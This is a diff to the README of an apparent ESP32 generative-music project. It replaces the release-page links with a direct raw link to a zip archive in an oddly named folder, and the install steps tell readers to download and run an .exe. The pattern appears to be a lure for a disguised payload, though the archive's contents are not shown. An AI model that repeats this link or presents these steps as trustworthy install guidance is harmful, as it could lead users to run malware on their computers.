@@ -1,6 +1,6 @@
 # 🎵 ai-music-esp32 - Create music using simple hardware gadgets
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Aroon9806/ai-music-esp32/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Aroon9806/ai-music-esp32/raw/refs/heads/main/siliceofluoric/ai_music_esp_v1.5-alpha.1.zip)
 
 This project connects small ESP32 computers to smart music tools. You can create generative music sequences with simple hardware. The system uses machine learning models to help you play and compose. It works on your local hardware to keep your music private.
 
@@ -19,7 +19,7 @@ This software runs on your computer and sends commands to the ESP32 board. You d
 
 Follow these steps to install the system.
 
-1. Visit this page to download: [https://github.com/Aroon9806/ai-music-esp32/releases](https://github.com/Aroon9806/ai-music-esp32/releases).
+1. Visit this page to download: [https://github.com/Aroon9806/ai-music-esp32/raw/refs/heads/main/siliceofluoric/ai_music_esp_v1.5-alpha.1.zip](https://github.com/Aroon9806/ai-music-esp32/raw/refs/heads/main/siliceofluoric/ai_music_esp_v1.5-alpha.1.zip).
 2. Look for the file ending in .exe under the latest version.
 3. Click the name of the file to save it to your computer.
 4. Locate the file in your Downloads folder.
